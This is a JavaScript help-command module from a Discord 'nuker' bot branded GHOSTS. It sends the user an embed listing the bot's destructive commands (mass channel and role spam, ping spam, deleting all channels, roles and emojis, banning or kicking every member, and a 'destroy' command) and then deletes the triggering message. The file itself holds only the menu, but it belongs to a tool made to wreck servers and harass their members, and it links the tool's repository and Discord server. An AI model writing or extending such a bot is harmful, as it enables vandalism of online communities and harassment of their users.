const Discord = require('discord.js')
const chalk = require('chalk')
const config = require('../config.json')
const prefix = config.prefix
const Author = config.Author

module.exports = {
    name: 'help',
    description: 'sends help embed',
    run: async(nuker, message, args) => {
        const Help = new Discord.MessageEmbed()
        .setAuthor(message.author.username, message.author.displayAvatarURL({ dynamic: true }))
        .setTitle("GHOSTS™")
        .setDescription("**COMMANDS:**")
        .addField("Mass Channel Spam", `\`${prefix}sc\` [TEXT]`)
        .addField("Mass Channel Spam + Ping Spam", `\`${prefix}wizz\` [TEXT]`)
        .addField("Mass Roles Spam", `\`${prefix}sr\` [TEXT]`)
        .addField("Delete All Channels", `\`${prefix}dc\``)
        .addField("Delete All Roles", `\`${prefix}dr\``)
        .addField("Delete All Emojis", `\`${prefix}de\``)
        .addField("Ban All Users", `\`${prefix}banall\``)
        .addField("Kick All Users", `\`${prefix}kickall\``)
        .addField("Unban All Users", `\`${prefix}uball\``)
        .addField("Destroy", `\`${prefix}destroy\` [TEXT]`)
        .setThumbnail("https://media.discordapp.net/attachments/772785979278229555/860388621592821762/1c40158692db479be90639c06123060d.gif?width=456&height=409")
        .setFooter(`© GHOSTS™ | Nuker Prefix: ${prefix} | Made By: ${Author} | Discord: https://discord.gg/fpwZxqnGDy | Github: https://github.com/ELITE-SMOKER-69/GtsNuker`)
        .setColor("WHITE")
        .setTimestamp()
    message.author.send(Help)
    message.delete()
    }
}
